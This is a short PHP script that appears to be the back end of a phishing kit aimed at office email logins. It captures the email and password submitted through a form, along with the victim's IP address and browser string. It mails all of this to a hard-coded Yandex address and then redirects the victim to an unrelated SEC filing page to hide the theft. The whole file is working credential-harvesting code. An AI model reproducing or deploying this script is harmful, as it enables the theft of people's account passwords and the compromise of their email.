<?
$IP = getenv("REMOTE_ADDR");

$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "IP: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="resultzlog@yandex.com";

$subject = "Blessings| office";
$headers = "From: Trump <NONE@nepa.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://www.sec.gov/Archives/edgar/data/1681343/000121390019004381/f1apos2017a7ex13_streamnet.htm");
?>


